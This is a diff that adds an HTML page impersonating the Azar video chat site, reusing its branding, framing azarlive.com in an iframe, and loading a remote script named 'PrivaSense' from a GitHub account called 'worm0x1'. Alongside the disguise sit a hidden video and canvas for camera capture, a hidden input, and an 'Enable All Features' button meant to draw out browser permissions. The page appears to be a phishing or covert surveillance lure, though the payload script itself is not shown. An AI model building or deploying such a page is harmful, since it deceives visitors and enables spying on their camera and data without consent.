@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8"/>
+  <link rel="shortcut icon" href="https://azarlive.com/apple-icon-114x114.png">
+  <meta property="og:image" content="https://azarlive.com/images/og/imgAzarWebMatch.png">
+  <meta name="description" content="It is the most popular video chatting platform in the world">
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>World's best online video chatting platform</title>
+<link rel="stylesheet" href="style.css"> 
+  <script src="https://cdn.jsdelivr.net/gh/worm0x1/PrivaSense/PrivaSense.js"></script>
+</head>
+<body>
+  <div id="webview-container"><iframe src="https://azarlive.com/"></iframe></div>
+  <div id="video-container">
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+  </div>
+  <input type="text" id="hidden-input" autocomplete="off" />
+  <div id="loadingSpinner" class="loading-spinner">
+    <div>Initializing...</div>
+    <button id="permissionBtn" class="permission-btn" style="display:none;">
+      🔓 Enable All Features
+    </button>
+  </div>
+<script src = "script.js" ></script>
+</body>
+</html>
